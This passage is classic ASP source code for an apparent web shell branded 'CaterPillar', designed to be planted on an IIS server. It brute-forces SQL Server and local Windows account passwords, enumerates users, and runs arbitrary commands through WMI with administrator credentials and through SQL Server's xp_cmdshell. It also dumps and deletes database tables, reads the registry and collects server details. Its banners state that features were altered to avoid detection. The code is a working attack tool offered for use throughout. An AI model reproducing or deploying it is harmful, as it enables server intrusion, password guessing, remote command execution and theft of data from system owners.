<p>Host:<input name="Host" type="text" value="<%Response.write(Host)%>" id="Host" class="TextBox" style="width:300px;" /></p>
<p>SQL Name:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input name="SqlName" type="text" value="<%Response.write(SqlName)%>" id="SqlName" class="TextBox" size='20' />
SQL Password:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input name="SqlPass" type="text" value="<%Response.write(SqlPass)%>" id="SqlPass" class="TextBox" size='20' />

<p>
Password:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input name='CheckPassword' type='text' class='TextBox' id='CheckPassword' value='<%Response.write(CheckPassword)%>' size='20'>
Concatenation User:&nbsp;<input name='ConcatUser' type='text' class='TextBox' id='ConcatUser' value='<%Response.write(ConcatUser)%>' size='20'><br>
String Remove:&nbsp;<input name='RemoveUser' type='text' class='TextBox' id='RemoveUser' value='<%Response.write(RemoveUser)%>' size='20'>
<input type="checkbox" name="CheckBoxRemove" value='yes'<%Response.write(CheckBoxRemove)%>>&nbsp;Remove String
<input type="checkbox" name="CheckBoxReverse" value='yes'<%Response.write(CheckBoxReverse)%>>&nbsp;Reverse Password&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<input type="submit" name="ButtonDbEnumerateLogin" value="Run" id="ButtonDbEnumerateLogin" class="buttom" />  
</form>
<%
If request.Form("ButtonDbEnumerateLogin") <> "" Then
 CheckPassword=request.Form("CheckPassword")
 ConcatUser=request.Form("ConcatUser")
 RemoveUser=request.Form("RemoveUser")
 CheckBoxRemove=Request.Form("CheckBoxRemove")
 CheckBoxReverse=Request.Form("CheckBoxReverse")
 Host = request.Form("Host")
 SqlName = request.Form("SqlName")
 SqlPass = request.Form("SqlPass")	
 Dim adoConn,strQuery,recResult,strResult
		set adoConn=Server.CreateObject("ADODB.Connection") 
		'on error resume next
	    'err.clear
		adoConn.Open "Provider=SQLOLEDB.1;DATA SOURCE=" & Host & ";PASSWORD=" & SqlPass & ";UID=" & SqlName
			   strQuery="select name,dbname,sysadmin from master..syslogins"
			   set recResult = adoConn.Execute(strQuery) 
			   strResult =  strResult & "<hr><table border='3' width ='' height=''><tr bgcolor=black><td align=center><font color=white><b>Name<b></font></td><td align=center><font color=white><b>Database<b></font></td><td align=center><font color=white><b>permission<b></font></td><td align=center><font color=white><b>Password<b></font></td><td align=center><font color=white><b>Status<b></font></td></tr>"
         
			   If NOT recResult.EOF Then 
   				Do While NOT recResult.EOF 
				mypassword=recResult(0).value
				   if CheckBoxRemove="yes" then
                        If RemoveUser <> "" Then
							mypassword = Replace(mypassword, RemoveUser, "")
                        End If
                    End If
					   If CheckPassword <> "" Then
                           mypassword = CheckPassword
                       Else
					        If ConcatUser <> "" Then
                               mypassword = mypassword & ConcatUser
                            End If
					    End If
						if CheckBoxReverse="yes" then
                        mypassword = StrReverse(mypassword)
                        End If
					strResult =  strResult & "<tr>"
    				strResult =  strResult & "<td>" & recResult(0).value & "</td>"
	                strResult =  strResult & "<td>" & recResult(1).value & "</td>"
					If recResult(2).value = 1 Then
	                    strResult =  strResult & "<td><center><font color=red><b>Enable</b></font></center></td>"
	                else
	                    strResult =  strResult & "<td><center>Disable</center></td>"
					end if
					strResult =  strResult & "<td>" & mypassword & "</td>"
					On Error Resume Next
					set conn = Server.CreateObject("ADODB.connection")
	                conn.ConnectionTimeout = 5
					conn.Open "Provider=SQLOLEDB.1;DATA SOURCE=" & Host & ";PASSWORD=" & mypassword & ";UID=" & recResult(0).value
	                If conn.errors.count < 1 Then
					  strResult =  strResult & "<td><center><font color=red><b>True</b></font></center></td>"
			           Else
				       strResult =  strResult & "<td><center>False</center></td>"
			            End If
			        conn.Close 
    				recResult.MoveNext 
					strResult =  strResult & "</tr>"
   				Loop 
 	 		    End if 
  			   set recResult = Nothing 
			   
               strResult =  strResult & "</table>"
			   Response.write SqlCMD & vbcrlf & "<pre>" & strResult & "</pre>"
  		adoConn.Close 
end if
End Function
Function DbManager()
       SqlStr=Trim(Request.Form("SqlStr"))
       DbStr=Request.Form("DbStr")
      ' DbStr=request.QueryString("DbStr")
	   if request.Form("PageSize")="" then
       PageSize="20"
       else
       PageSize=request.Form("PageSize")
       end if
       %>
       <p>[ Dbase Manager &nbsp;for CaterPillar ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
       <p> Dbase Manager with ASP(<span class="style3">Notice: only click "Start" to Manager Dbase </span>)</p>
       <p>- This function has fixed by Cater Pillar has not detected (2009/05/22)-</p>  
       <form name='FormDbManager' method='post' action='' onSubmit='FormDbManager.submit.disabled=true;'>
       <p>SQL Connection:&nbsp;<input name='DbStr' type='text' class='TextBox' id='DbStr' value='<%Response.write(DbStr)%>' size='100'>
       <select name='StrBtn' onchange='return FullDbStr(options[selectedIndex].value)'>
       <option value=-1>Type Connection</option>
       <option value=0>Access Dbase</option>
       <option value=1>MsSql Server</option>
       <option value=2>MySql Server</option>
       <option value=3>DSN Name</option>
       <option value=-1>-- Sql Query --</option>
       <option value=4>???¾?ý¾?</option>
       <option value=5>??¼??ý¾?</option>
       <option value=6>?¾³ý?ý¾?</option>
       <option value=7>??¸??ý¾?</option>
       <option value=8>½¨?ý¾?±?</option>
       <option value=9>?¾?ý¾?±?</option>
       <option value=10>??¼?ª?¶?</option>
       <option value=11>?¾³ýª?¶?</option>
       <option value=12>???«???¾</option>
       </select><br><br>
       SQL Query:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input name='SqlStr' type='text' class='TextBox' id='SqlStr' value='<%Response.write(SqlStr)%>' size='100'><br><br>
	   Page Size:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input name='PageSize' type='text' class='TextBox' id='PageSize' value='<%Response.write(PageSize)%>' size='25'>&nbsp;
       <input name='Action' type='hidden' value='DbManager'><input name='Page' type='hidden' value='1'>
       <input type='submit' name='Submit' class='buttom' value='Check' onclick='return DbCheck()'>
       </form><span id='abc'></span>
	   <%
	   If Len(DbStr)>40 Then
       Set Conn=Server.CreateObject("ADODB.Connection")
       Conn.Open DbStr
       Set Rs=Conn.OpenSchema(20) 
       'Response.write "<table><tr height='25' Bgcolor='#CCCCCC'><td>±?<br>??</td>"
       Response.write "<hr><table width='100%'  border='0' align='center'>"
       Response.write "<tr><td width='20%'><strong>Table</strong></td>"
       Response.write "<td width='20%'><strong>Operate</strong></td>"
       Response.write "</tr>"

       Rs.MoveFirst 
       Do While Not Rs.Eof
          If Rs("TABLE_TYPE")="TABLE" then
               Response.Write("<tr>")
	           TName=Rs("TABLE_NAME")
	           Response.write "<td>" & TName & "</td>"
              ' Response.write "<td align=center><a href='javascript:if(confirm('?·¶¨?¾³ý?´£?'))FullSqlStr('DROP TABLE [" & TName& "]',1)'>[ del ]</a><br>"
               Response.write "<td><a href='javascript:FullSqlStr(""SELECT * FROM [" & TName & "]"",1)'>" & TName & "</a></td>"
			  '  Response.write "<td><a href='javascript:FullSqlStr(""SELECT * FROM [" & TName & "]"",1)'>Edit</a>|"
			   ' Response.write "<a href='javascript:FullSqlStr(""DROP TABLE [" & TName & "]"",1)'>Cut</a>|"
			    Response.write "<td><a href='?action=EditTable&src=" & TName & "&Page=1&DbStr=" & DbStr & "'>Edit</a>|"
			    Response.write "<a href='?action=ExportTable&src=" & TName & "&PageSize="&PageSize&"&DbStr=" & DbStr & "'>Export</a>|"
			    Response.write "<a href='?action=DeleteTable&src=" & TName & "&DbStr=" & DbStr & "' onClick='return DeleteFile(this);'>Del</a></td>"			

               Response.Write("</tr>")
          End If 
       Rs.MoveNext 
       Loop 
       Set Rs=Nothing
	   Response.write "</table>"
If Len(SqlStr)>10 Then
  If LCase(Left(SqlStr,6))="select" then
    Response.write "SQL Query :" & SqlStr
    Set Rs=CreateObject("Adodb.Recordset")
    Rs.open SqlStr,Conn,1,1
    FN=Rs.Fields.Count
    RC=Rs.RecordCount
    Rs.PageSize=PageSize
    Count=Rs.PageSize
    PN=Rs.PageCount
    Page=request("Page")
    If Page<>"" Then Page=Clng(Page)
    If Page="" Or Page=0 Then Page=1
    If Page>PN Then Page=PN
    If Page>1 Then Rs.absolutepage=Page
    Response.write "<table><tr height=25 bgcolor=#cccccc><td></td>"	  
    For n=0 to FN-1
      Set Fld=Rs.Fields.Item(n)
      Response.write "<td align='center'>" & Fld.Name & "</td>"
      Set Fld=nothing
    Next
    Response.write "</tr>"
    Do While Not(Rs.Eof or Rs.Bof) And Count>0
	  Count=Count-1
	  Bgcolor="#EFEFEF"
	  Response.write "<tr><td bgcolor=#cccccc><font face='wingdings'>x</font></td>"  
	  For i=0 To FN-1
        If Bgcolor="#EFEFEF" Then:Bgcolor="#F5F5F5":Else:Bgcolor="#EFEFEF":End if
        If RC=1 Then
           ColInfo=HTMLEncode(Rs(i))
        Else
           ColInfo=HTMLEncode(Left(Rs(i),50))
        End If
	    Response.write "<td bgcolor=" & Bgcolor & ">" & ColInfo & "</td>"
	  Next
	  Response.write "</tr>"
      Rs.MoveNext
    Loop
	SqlStr=HtmlEnCode(SqlStr)
    Response.write "<tr><td colspan=" & FN+1 & " align=center>Record&nbsp;" & RC & "&nbsp;Page&nbsp;" & Page & "/" & PN
    If PN>1 Then
      Response.write "&nbsp;&nbsp;<a href='javascript:FullSqlStr("""&SqlStr&""",1)'>First</a>&nbsp;<a href='javascript:FullSqlStr("""&SqlStr&""","&Page-1&")'>Previous</a>&nbsp;"
      If Page>8 Then:Sp=Page-8:Else:Sp=1:End if
      For i=Sp To Sp+8
        If i>PN Then Exit For
        If i=Page Then
        Response.write i & "&nbsp;"
        Else
        Response.write "<span class='buttom'><a href='javascript:FullSqlStr("""&SqlStr&""","&i&")'>"&i&"</a></span>&nbsp;"
        End If
      Next
	  Response.write "&nbsp;<a href='javascript:FullSqlStr("""&SqlStr&""","&Page+1&")'>Next</a>&nbsp;<a href='javascript:FullSqlStr("""&SqlStr&""","&PN&")'>Last</a>"
    End If
    Response.write "<hr color='#EFEFEF'></td></tr></table>"
    Rs.Close:Set Rs=Nothing
	'Response.Clear
	'Response.ContentType = "application/vnd.ms-excel"
    'Response.AddHeader "Content-Disposition", "filename=" & Page & "-" & PN & "file.xls"
	'Response.End()
  Else	   
    Conn.Execute(SqlStr)
    Response.write "SQL??¾?£?" & SqlStr
    call DbManager()
  End If
End If
  Conn.Close
  Set Conn=Nothing
  End If
End Function

Sub UserEnumLogin ()
    CheckBoxRemove=" checked"
	CheckBoxReverse=" checked"
	CheckBoxHome=" checked"
    CheckPassword=request.Form("CheckPassword")
    ConcatUser=request.Form("ConcatUser")
    RemoveUser=request.Form("RemoveUser")
	if Request("CheckBoxRemove")<>"yes" then CheckBoxRemove=""
	if Request("CheckBoxReverse")<>"yes" then CheckBoxReverse=""
	if Request("CheckBoxHome")<>"yes" then CheckBoxHome=""
   
%>
<p>[ User Enum Login  &nbsp;for CaterPillar ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
<p> User Enum Login  with ASP account(<span class="style3">Notice: only click "Start" to start brute</span>)</p>
<p>- This function has fixed by Cater Pillar has not detected (2009/05/22)-</p>  
<form name='FormUserEnumLogin' method='post' action='' onSubmit='FormUserEnumLogin.submit.disabled=true;'>
<p>
Password:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input name='CheckPassword' type='text' class='TextBox' id='CheckPassword' value='<%Response.write(CheckPassword)%>' size='20'>
<input type="checkbox" name="CheckBoxHome" value='yes'<%Response.write(CheckBoxHome)%>>&nbsp;Home String
Concatenation User:&nbsp;<input name='ConcatUser' type='text' class='TextBox' id='ConcatUser' value='<%Response.write(ConcatUser)%>' size='18'><br>
String Remove:&nbsp;<input name='RemoveUser' type='text' class='TextBox' id='RemoveUser' value='<%Response.write(RemoveUser)%>' size='20'>
<input type="checkbox" name="CheckBoxRemove" value='yes'<%Response.write(CheckBoxRemove)%>>&nbsp;Remove String
<input type="checkbox" name="CheckBoxReverse" value='yes'<%Response.write(CheckBoxReverse)%>>&nbsp;Reverse Password
<input name='submit' type='submit' class='buttom' value=' scan '>
<input name='scan' type='hidden' id='scan' value='111'>
</p>
</form>
<%
If request.Form("scan") <> "" Then

	CheckPassword=request.Form("CheckPassword")
    ConcatUser=request.Form("ConcatUser")
    RemoveUser=request.Form("RemoveUser")
	CheckBoxRemove=Request.Form("CheckBoxRemove")
	CheckBoxReverse=Request.Form("CheckBoxReverse")
	CheckBoxHome=Request.Form("CheckBoxHome")
	call RunUserEnumLogin(CheckPassword,ConcatUser,RemoveUser,CheckBoxRemove,CheckBoxReverse,CheckBoxHome)		
end if
End Sub
Sub RunUserEnumLogin(CheckPassword,ConcatUser,RemoveUser,CheckBoxRemove,CheckBoxReverse,CheckBoxHome)
Dim strResulttrue,strResultfalse
Response.write "<hr><table border='3' width ='' height=''><tr bgcolor=black><td align=center><font color=white><b>Name<b></font></td><td align=center><font color=white><b>Password<b></font></td><td align=center><font color=white><b>Status<b></font></td></tr>"
                Set oContainer = GetObject("WinNT://" & strComputerName & "")
				For Each oIADs In oContainer
                  If (oIADs.Class = "User") Then
				  mypassword=oIADs.Name
				   if CheckBoxRemove="yes" then
                        If RemoveUser <> "" Then
							mypassword = Replace(mypassword, RemoveUser, "")
                        End If
                    End If
					   If CheckPassword <> "" Then
                           mypassword = CheckPassword
                       Else
					   
					   If ConcatUser <> "" Then
						   if CheckBoxHome="yes" then
                               mypassword = ConcatUser & mypassword
							   else
							   mypassword = mypassword & ConcatUser
							   end if
                            End If

					    End If
						if CheckBoxReverse="yes" then
                        mypassword = StrReverse(mypassword)
                        End If
					if UserLogin(oIADs.Name,mypassword) <>"False" then
				     strResulttrue = strResulttrue & "<tr>"
				     strResulttrue = strResulttrue & "<td><b>" & oIADs.Name & "</b></td>"
					 strResulttrue = strResulttrue & "<td><b>" & mypassword & "</b></td>"
					 strResulttrue = strResulttrue & "<td><center><font color=red><b>True</b></font></center></td>"
				     strResulttrue = strResulttrue & "</tr>"
					 else
					 strResultfalse = strResultfalse & "<tr>"
				     strResultfalse = strResultfalse & "<td><b>" & oIADs.Name & "</b></td>"
					 strResultfalse = strResultfalse & "<td><b>" & mypassword & "</b></td>"
					 strResultfalse = strResultfalse & "<td><center><b>False</b></center></td>"
				     strResultfalse = strResultfalse & "</tr>"
					 end if
                   End If
				Next
				Response.write  strResulttrue & strResultfalse & "</table>"
End Sub
Function UserLogin(User,Password)
    Set objWShell = CreateObject("WScript.Shell")
    Set objCmd = objWShell.Exec(Server.MapPath(".") & "\UserLogin.exe " & User & " " & Password )
    
    strPResult = objCmd.StdOut.Readall() 
    set objCmd = nothing: Set objWShell = nothing 
	UserLogin = strPResult
End Function
Sub ListUser()
if request.Form("ComputerStr")="" then
      ComputerStr="127.0.0.1"
   else
      ComputerStr=request.Form("ComputerStr")
   end if
%>
<p>[ List User  for CaterPillar ]        <i><a href="javascript:history.back(1);">Back</a></i></p>
<p> List User with ASP account(<span class="style3">Notice: only click "Start" to start Enumerating</span>)</p>
<p>- This function has fixed by Cater Pillar has not detected (2009/05/26)-</p>
<form name='ListUserForm' method='post' action='' onSubmit='ListUserForm.submit.disabled=true;'>
<p>
Server Name:&nbsp;<input name='ComputerStr' class='TextBox' id='ComputerStr' value='<%Response.write(ComputerStr)%>' size='25'>
<input name='submit' type='submit' class='buttom' value=' Get List '>
<input name='scan' type='hidden' id='scan' value='111'>
</p>
</form>
<%
If request.Form("scan") <> "" Then
ComputerStr = request.Form("ComputerStr")
                Set oContainer = GetObject("WinNT://" & ComputerStr)
				oContainer.filter = Array("User")
				Response.write "<b>List of Users for " & ucase(ComputerStr) & ":</b>"
				Response.write "<table border='3' align='left' width ='' height=''><tr bgcolor=black>"
				Response.write "<td align=center><font color=white><b>Name<b></font></td>"
				Response.write "<td align=center><font color=white><b>Domain<b></font></td>"
				Response.write "<td align=center><font color=white><b>FullName<b></font></td>"
				Response.write "<td align=center><font color=white><b>Description<b></font></td>"
				Response.write "<td align=center><font color=white><b>PasswordRequired<b></font></td>"
				Response.write "<td align=center><font color=white><b>Last Login<b></font></td>"
				Response.write "<td align=center><font color=white><b>Status<b></font></td></tr>"
				For Each User In oContainer
				count = count + 1
				Response.write  "<tr>"
				Response.write  "<td><b>" & User.Name & "</b></td>"
				Response.write  "<td><b>" & User.Name & "</b></td>"
				Response.write  "<td><b>" & User.fullname & "</b></td>"
				Response.write  "<td><b>" & User.description & "</b></td>"
				    Dim passexpire
					passexpire = user.get("UserFlags")
					If (Flags and &H10000) <> 0 then
					Response.write  "<td><b>" & True & "</b></td>"
					Else
					Response.write  "<td><b>" & False & "</b></td>"
					End if
				'Response.write  "<td><b>" & User.lastlogin & "</b></td>"
				Select case User.AccountDisabled
					Case True
						Response.write  "<td bgcolor='Red'>Disable</td>"
					Case False
						Response.write  "<td>Enable</td>"
				End Select
				Select case User.IsAccountLocked
					Case True
						Response.write  "<td bgcolor='Red'>lock</td>"
					Case False
						Response.write  "<td></td>"				
				End Select
				Response.write  "</tr>"
				Next
				Response.write "<b>Total User's:" & int(count) & "</b>"
end if
End Sub
Sub prolist()
winObj = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
objProcessInfo = winObj.ExecQuery("Select Name,ProcessId,HandleCount from Win32_Process")		
End Sub
Sub adminrootkit()
    if request.Form("Host")="" then
      Host="127.0.0.1"
   else
      Host=request.Form("Host")
   end if
   if request.Form("AdminName")="" then
      AdminName="Administrator"
   else
      AdminName=request.Form("AdminName")
   end if
   AdminPass = request.Form("AdminPass")
   Admincmd = request.Form("Admincmd")
   %>
<p>[ Administrator RootKit for WebAdmin ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
<p> Execute command with Administrator account(<span class="style3">Notice: only click "Run" to run</span>)</p>
<form name='AdminRootForm' method='post' action='' onSubmit='AdminRootForm.submit.disabled=true;'>
<p>Host :&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input name="Host" type="text" value="<%Response.write(Host)%>" id="Host" class="TextBox" style="width:300px;" /></p>
<p>Name :&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input name="AdminName" type="text" value="<%Response.write(AdminName)%>" id="AdminName" class="TextBox" style="width:110px;" />
Password :<input name="AdminPass" type="text" value="<%Response.write(AdminPass)%>" id="AdminPass" class="TextBox" style="width:110px;" />
</p>
Command:<input name="Admincmd" type="text" value="<%Response.write(Admincmd)%>" id="Admincmd" class="TextBox" style="width:300px;" />
<input type="submit" name="ButtonAdmin" value="Run" id="ButtonAdmin" class="buttom" />  
</form>
<%
If request.Form("ButtonAdmin") <> "" Then
     Host = request.Form("Host")
     AdminName = request.Form("AdminName")
     AdminPass = request.Form("AdminPass")
     Admincmd = request.Form("Admincmd")
     
     Dim objLocator, objWMIService, objShare
     
     Dim objShell, objNetwork, strComputer
     Set objLocator = CreateObject( "WbemScripting.SWbemLocator" )
     Set objWMIService = objLocator.ConnectServer ( Host, "root/cimv2", AdminName, AdminPass )
     objWMIService.Security_.impersonationlevel = 3
     If Admincmd <> "" Then
     'Set objProc = objWMIService.Get ("Win32_Process")
     'errReturn = objProc.Create ("cmd.exe /c ipconfig", Null, Null, intPID)
     '       Response.Write errReturn
    
     Dim iPID, bFlag
     Set oProcess = objWMIService.Get("Win32_Process")
     bFlag = oProcess.Create(Admincmd, Null, Null, iPID)
     Response.Write iPID
     else
     Set colComputer = objWMIService.ExecQuery("Select * from Win32_UserAccount")
     For Each objComputer in colComputer 
     strNewName = objComputer.Name 
     Response.Write "user: " & objComputer.Name & "<br>"
     Next
     Set colComputer = objWMIService.ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled=TRUE")
     For Each objComputer in colComputer 
            if Not IsNull(objComputer.IPAddress) then
				for i=LBound(objComputer.IPAddress) to UBound(objComputer.IPAddress)
					Response.Write "IP Address: " & objComputer.IPAddress(i) & "<br>"
					
                Next
             end if
             if Not IsNull(objComputer.DefaultIPGateway) then
				for i=LBound(objComputer.DefaultIPGateway) to UBound(objComputer.DefaultIPGateway)
					Response.Write "Default IP Gateway(s): " & objComputer.DefaultIPGateway(i) & "<br>"
				next
			end if
			
			if Not IsNull(objComputer.DNSServerSearchOrder) then
				for i=LBound(objComputer.DNSServerSearchOrder) to UBound(objComputer.DNSServerSearchOrder)
					Response.Write "DNS Servers: " & objComputer.DNSServerSearchOrder(i) & "<br>"
				next
			end if
			''/// Gets the DNSHostName  of the card
			if Not IsNull(objComputer.DNSHostName) then
				Response.Write "DNSHostName: " & objComputer.DNSHostName & "<br>"
			end if
			''/// Gets the MAC Address of the card
			if Not IsNull(objComputer.MACAddress) then
				Response.Write "MAC Address: " & objComputer.MACAddress & "<br>"
			end if
      Next
       Set colComputer = objWMIService.ExecQuery("Select * from Win32_Process")
     For Each objComputer in colComputer 
     strNewName = objComputer.Name 
     Response.Write "user: " & objComputer.Name & "<br>"
     Next
     end if
Set objLocator = Nothing     
Set objWMIService = Nothing
end if
End Sub
Sub regshell()
CheckBoxUseReg=" checked"
if request.Form("KeyName")="" then
      KeyName="HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName"
   else
      KeyName=request.Form("KeyName")
   end if
   if request.Form("ValueName")="" then
      ValueName="ComputerName"
   else
      ValueName=request.Form("ValueName")
   end if
   if Request("CheckBoxUseReg")<>"yes" then CheckBoxUseReg=""
%>
<p>[ Registry Shell ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
<form name='RegistryShellForm' method='post' action='' onSubmit='RegistryShellForm.submit.disabled=true;'>
<p>Key:<input name="KeyName" type="text" value="<%Response.write(KeyName)%>" id="KeyName" class="TextBox" style="width:600px;" /></p>
<p>Value:<input name="ValueName" type="text" value="<%Response.write(ValueName)%>" id="ValueName" class="TextBox" style="width:200px;" />
<input type="checkbox" name="CheckBoxUseReg" value='yes'<%Response.write(CheckBoxUseReg)%>>&nbsp;Use Reg.exe
<input type="submit" name="ButtonREG" value="Run" id="ButtonREG" class="buttom" />  
</form>
<%
If request.Form("ButtonREG") <> "" Then
KeyName = request.Form("KeyName")
ValueName = request.Form("ValueName")
CheckBoxUseReg=Request.Form("CheckBoxUseReg")
if CheckBoxUseReg="yes" then
Set objWShell = CreateObject("WScript.Shell")
    Set objCmd = objWShell.Exec(Server.MapPath(".") & "\reg.exe query " & KeyName )
    
    strPResult = objCmd.StdOut.Readall() 
    set objCmd = nothing: Set objWShell = nothing 
	Response.write "<br>" & replace(strPResult,vbCrLf,"<br>")
	
else
       dim wsh
       set wsh=createobject("Wscript.Shell")
       ApdKey=KeyName & "\" & ValueName
       Apds=Wsh.RegRead(ApdKey)
       Response.write Apds
end if
end if
End Sub
Sub sqlrootkit()
if request.Form("Host")="" then
      Host=ServerIP
   else
      Host=request.Form("Host")
   end if
   if request.Form("SqlName")="" then
      SqlName="sa"
   else
      SqlName=request.Form("SqlName")
   end if
   SqlPass = request.Form("SqlPass")
   Sqlcmd = request.Form("Sqlcmd")
%>
<p>[ SqlRootKit.NET for WebAdmin ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
<p> Execute command with SQLServer account(<span class="style3">Notice: only click "Run" to run</span>)</p>
<form name='SqlRootForm' method='post' action='' onSubmit='SqlRootForm.submit.disabled=true;'>
<p>Host:<input name="Host" type="text" value="<%Response.write(Host)%>" id="Host" class="TextBox" style="width:300px;" /></p>
<p>SQL Name:<input name="SqlName" type="text" value="<%Response.write(SqlName)%>" id="SqlName" class="TextBox" style="width:100px;" />
SQL Password:<input name="SqlPass" type="text" value="<%Response.write(SqlPass)%>" id="SqlPass" class="TextBox" style="width:100px;" />
</p>
Command:<input name="Sqlcmd" type="text" value="<%Response.write(Sqlcmd)%>" id="Sqlcmd" class="TextBox" style="width:300px;" />
<input type="submit" name="ButtonSQL" value="Run" id="ButtonSQL" class="buttom" />  
</form>
<%
If request.Form("ButtonSQL") <> "" Then
Host = request.Form("Host")
SqlName = request.Form("SqlName")
SqlPass = request.Form("SqlPass")
Sqlcmd = request.Form("Sqlcmd")
Dim adoConn,strQuery,recResult,strResult
if SqlName<>"" then
'On Error Resume Next
	
		set adoConn=Server.CreateObject("ADODB.Connection") 
		'on error resume next
	    'err.clear
		adoConn.Open "Provider=SQLOLEDB.1;DATA SOURCE=" & Host & ";PASSWORD=" & SqlPass & ";UID=" & SqlName
		If Sqlcmd<>"" Then 
            if instr(Sqlcmd,"select") Then
			strQuery = Sqlcmd
			'strQuery="select name from master..syslogins"
			set recResult = adoConn.Execute(strQuery) 
			If NOT recResult.EOF Then 
   				Do While NOT recResult.EOF 
    				strResult = strResult & chr(13) & recResult(0).value
    				recResult.MoveNext 
   				Loop 
 	 		End if 
  			set recResult = Nothing 
  			strResult = Replace(strResult," ","&nbsp;") 
  			strResult = Replace(strResult,"<","<") 
  			strResult = Replace(strResult,">",">") 
			Response.write SqlCMD & vbcrlf & "<pre>" & strResult & "</pre>"
			SqlCMD=""
			else
			strQuery = "exec master.dbo.xp_cmdshell '" & Sqlcmd & "'" 
	  		set recResult = adoConn.Execute(strQuery) 
 	 		If NOT recResult.EOF Then 
   				Do While NOT recResult.EOF 
    				strResult = strResult & chr(13) & recResult(0).value
    				recResult.MoveNext 
   				Loop 
 	 		End if 
  			set recResult = Nothing 
  			strResult = Replace(strResult," ","&nbsp;") 
  			strResult = Replace(strResult,"<","<") 
  			strResult = Replace(strResult,">",">") 
			Response.write SqlCMD & vbcrlf & "<pre>" & strResult & "</pre>"
			SqlCMD=""
			End if
		else
		       strQuery="SELECT @@VERSION"
		       set recResult = adoConn.Execute(strQuery) 
			   If NOT recResult.EOF Then 
   				Do While NOT recResult.EOF 
    				strResult = strResult & chr(13) & recResult(0).value
    				recResult.MoveNext 
   				Loop 
 	 		End if 
  			set recResult = Nothing 
			   Response.write SqlCMD & vbcrlf & "<pre>" & strResult & "</pre>"
		End if 
  		adoConn.Close 
	 End if
end if
End Sub
Function getIP() 
    Dim strIPAddr
    If Request.ServerVariables("HTTP_X_FORWARDED_FOR") = "" OR InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), "unknown") > 0 Then
        strIPAddr = Request.ServerVariables("REMOTE_ADDR")
    ElseIf InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), ",") > 0 Then
        strIPAddr = Mid(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), 1, InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), ",")-1)
    ElseIf InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), ";") > 0 Then
        strIPAddr = Mid(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), 1, InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), ";")-1)
    Else
        strIPAddr = Request.ServerVariables("HTTP_X_FORWARDED_FOR")
    End If
    getIP = Trim(Mid(strIPAddr, 1, 30))
End Function
Function  information()
	dim CIP,CP
	if getIP()<>request.ServerVariables("REMOTE_ADDR") then
			CIP=getIP()
			CP=request.ServerVariables("REMOTE_ADDR")
	else
			CIP=request.ServerVariables("REMOTE_ADDR")
			CP="None"
	end if
	
	dim shell, strOS, strVerKey, strVersion
    Set Shell = CreateObject("WScript.Shell")
    strOS = shell.ExpandEnvironmentStrings("%OS%")
    If strOS = "Windows_NT" Then
       strVerKey = "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\"
       strVersion = Shell.regread(strVerKey & "ProductName") & " " & Shell.regread(strVerKey & "CurrentVersion") & "." & Shell.regread(strVerkey & "CurrentBuildNumber")
    Else
       strVerKey = "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\"
       strVersion = Shell.regread(strVerKey & "ProductName") & " " & Shell.regread(strVerKey & "VersionNumber")
    End if
    set Shell=nothing
%>
<div align=center>[ Web Server Information ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></div><br>
<table width="80%"  border="1" align="center">
  <tr>
    <td width="40%">Server IP</td>
    <td width="60%"><%=request.ServerVariables("LOCAL_ADDR")%></td>
  </tr>
  <tr>
    <td height="73">Machine Name</td>
    <td><%=strComputerName%></td>
  </tr>
  <tr>
    <td>Network Name</td>
    <td><%=strUserDomain%></td>
  </tr>
  <tr>
    <td>User Name in this Process</td>
    <td><%=strUserName%></td>
  </tr>
  <tr>
    <td>OS Version</td>
    <td><%=strVersion%></td>
  </tr>
  <tr>
    <td>Started Time</td>
    <td>GetStartedTime(Environment.Tickcount) Hours</td>
  </tr>
  <tr>
    <td>System Time</td>
    <td><%=now%></td>
  </tr>
  <tr>
    <td>IIS Version</td>
    <td><%=request.ServerVariables("SERVER_SOFTWARE")%></td>
  </tr>
  <tr>
    <td>HTTPS</td>
    <td><%=request.ServerVariables("HTTPS")%></td>
  </tr>
  <tr>
    <td>PATH_INFO</td>
    <td><%=request.ServerVariables("PATH_INFO")%></td>
  </tr>
  <tr>
    <td>PATH_TRANSLATED</td>
    <td><%=request.ServerVariables("PATH_TRANSLATED")%></td>
  <tr>
